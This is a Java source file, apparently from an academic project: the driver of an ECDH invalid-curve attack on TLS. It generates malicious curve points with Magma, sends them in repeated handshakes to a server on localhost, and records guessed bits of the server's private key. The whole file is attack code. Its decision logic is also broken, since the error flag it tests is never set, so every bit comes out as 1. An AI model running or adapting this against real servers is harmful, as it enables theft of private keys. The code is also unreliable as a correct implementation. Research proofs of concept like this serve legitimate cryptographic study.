package de.rub.nds.ecdhattack;

import de.rub.nds.ecdhattack.utilities.MagmaUtilities;
import de.rub.nds.ecdhattack.utilities.NastyPoint;
import de.rub.nds.ecdhattack.utilities.TLSConnector;
import de.rub.nds.ssl.stack.ECUtility;
import de.rub.nds.ssl.stack.protocols.handshake.extensions.datatypes.EECPointFormat;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.net.SocketException;

/**
 * ECC DH Attack Entry Point.
 *
 * @author Christopher Meyer - christopher.meyer@rub.de
 * @version 0.1
 *
 * Sep 19, 2013
 */
public final class GetToThePoint {

    private static final String DEFAULT_CODE_PATH = "/opt/code.magma";
    private static final String MAGMA_COMMAND = "/home/chris/Desktop//MagmaLinux2.11/scripts/magma";
    private static final String HOST = "127.0.0.1";
    private static final int PORT = 51707;
    // How many point sto check until we are certain about the deciscion
    private static final int CHECK_LIMIT = 5;
    private static final int BITS_TO_CHECK = 10;
    private static String KNOWN_BITS = "<1,0>;";

    public void launchAttack() throws SocketException, IOException,
            InterruptedException {
        MagmaUtilities magma = new MagmaUtilities(DEFAULT_CODE_PATH,
                MAGMA_COMMAND);
        TLSConnector tlsConnector = new TLSConnector(HOST, PORT);
        byte[] encodedNastyPoint;
        boolean normalErrorDetected = false;

        for (int i = 0; i < BITS_TO_CHECK; i++) {
            System.out.println("Guessed Bits so far: " + KNOWN_BITS);
            NastyPoint point = new NastyPoint();
            for (int j = 0; j < CHECK_LIMIT; j++) {
                if (normalErrorDetected) {
                    break;
                }

                // create new point
                point = magma.getNewPoint(KNOWN_BITS, point.yCounter + 1);
                encodedNastyPoint = ECUtility.encodeX9_62(point.x.toByteArray(),
                        point.y.toByteArray(), EECPointFormat.UNCOMPRESSED);      

                // start the handshake
                tlsConnector.launchBitExtraction(encodedNastyPoint, encodedNastyPoint);
            }

            if (normalErrorDetected) {
                KNOWN_BITS = KNOWN_BITS.substring(0, KNOWN_BITS.length() - 4)
                        + "0,0>;";
            } else {
                KNOWN_BITS = KNOWN_BITS.substring(0, KNOWN_BITS.length() - 4)
                        + "1,0>;";
            }

        }
    }

    /**
     * @param args the command line arguments
     * @throws FileNotFoundException
     * @throws IOException
     * @throws InterruptedException
     */
    public static void main(final String[] args) throws FileNotFoundException,
            IOException, InterruptedException {
        // fire and forget!
        GetToThePoint instance = new GetToThePoint();
        instance.launchAttack();
    }
}
